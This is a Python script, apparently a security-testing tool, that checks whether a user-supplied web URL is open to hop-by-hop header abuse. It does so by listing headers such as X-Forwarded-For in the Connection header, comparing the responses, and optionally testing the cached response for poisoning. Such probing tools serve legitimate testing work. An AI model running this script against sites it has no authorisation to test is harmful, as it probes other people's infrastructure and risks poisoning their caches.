# github.com/ndavison
#
#
##
##

import requests
import random
import string
from argparse import ArgumentParser


parser = ArgumentParser(description="Attempts to find hop-by-hop header abuse potential against the provided URL.")
parser.add_argument("-u", "--url", help="URL to target (without query string)")
parser.add_argument("-x", "--headers", default="X-Forwarded-For", help="A comma separated list of headers to add as hop-by-hop")
parser.add_argument("-c", "--cache-test", action="store_true", help="Test for cache poisoning")
parser.add_argument("-d", "--disable-size-check", action="store_true", help="Don't compare response size when detecting changes between normal and hop-by-hop requests")
parser.add_argument("-v", "--verbose", action="store_true", help="More output")

args = parser.parse_args()

if not args.url:
    print('Must supply a URL to target')
    exit(1)

letters = string.ascii_lowercase

headers = {
    'Connection': 'keep-alive, %s' % args.headers
}
params1 = {
    'cb': ''.join(random.choice(letters) for i in range(10))
}
params2 = {
    'cb': ''.join(random.choice(letters) for i in range(10))
}

# try a normal request and one with the hop-by-hop headers (and a cache buster to avoid accidental cache poisoning)
try:
    if args.verbose:
        print("Trying %s?%s" % (args.url, params1['cb']))
    res1 = requests.get(args.url, params=params1, allow_redirects=False)
    if args.verbose:
        print('Trying %s?%s with hop-by-hop headers "%s"' % (args.url, params2['cb'], args.headers))
    res2 = requests.get(args.url, headers=headers, params=params2, allow_redirects=False)
except requests.exceptions.ConnectionError as e:
    print(e)
    exit(1)

# did adding the HbH headers cause a different response?
if res1.status_code != res2.status_code or (not args.disable_size_check and len(res1.content) != len(res2.content)):
    if res1.status_code != res2.status_code:
        print('%s returns a %s, but returned a %s with the hop-by-hop headers of "%s"' % (args.url, res1.status_code, res2.status_code, args.headers))
    if not args.disable_size_check and len(res1.content) != len(res2.content):
        print('%s was %s in response size, but was %s with the hop-by-hop headers of "%s"' % (args.url, len(res1.content), len(res2.content), args.headers))
    # if enabled, run the cache poison test by quering the HbH request's cache buster without the HbH headers and comparing status codes
    if args.cache_test:
        try:
            res3 = requests.get(args.url, params=params2, allow_redirects=False)
        except requests.exceptions.ConnectionError as e:
            print(e)
            exit(1)
        if res3.status_code == res2.status_code:
            print('%s?cb=%s poisoned?' % (args.url, params2['cb']))
        else:
            print('No poisoning detected')
else:
    if args.verbose:
        print('No change detected requesting "%s" with the hop-by-hop headers "%s"' % (args.url, args.headers))
        
##
##
